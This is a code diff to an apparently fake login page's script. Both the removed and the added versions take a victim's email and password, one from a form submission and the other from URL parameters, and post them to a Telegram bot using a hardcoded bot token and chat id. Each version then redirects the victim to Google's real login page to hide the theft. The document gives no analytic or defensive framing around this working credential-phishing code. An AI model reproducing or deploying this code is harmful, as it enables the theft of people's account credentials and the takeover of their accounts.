@@ -23,36 +23,29 @@
 
   <script>
     window.addEventListener("DOMContentLoaded", function () {
-      const form = document.getElementById("login-form");
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      const password = urlParams.get('password');
 
-      if (form) {
-        form.addEventListener("submit", function (e) {
-          e.preventDefault();
+      if (email && password) {
+        const telegramBotToken = "7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ";
+        const chatId = "7817453978";
 
-          const emailInput = document.getElementById("email");
-          const passwordInput = document.getElementById("password");
-
-          if (emailInput && passwordInput) {
-            const email = emailInput.value;
-            const password = passwordInput.value;
-
-            const telegramBotToken = "7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ";
-            const chatId = "7817453978";
-
-            fetch(https://api.telegram.org/bot${telegramBotToken}/sendMessage, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: Email: ${email}\nPassword: ${password}
-              })
-            });
-
-            window.location.href = "https://accounts.google.com";
-          }
+        fetch(https://api.telegram.org/bot${telegramBotToken}/sendMessage, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: Email: ${email}\nPassword: ${password}
+          })
         });
+
+        // إعادة التوجيه بعد الإرسال
+        setTimeout(() => {
+          window.location.href = "https://accounts.google.com";
+        }, 1500);
       }
     });
   </script>
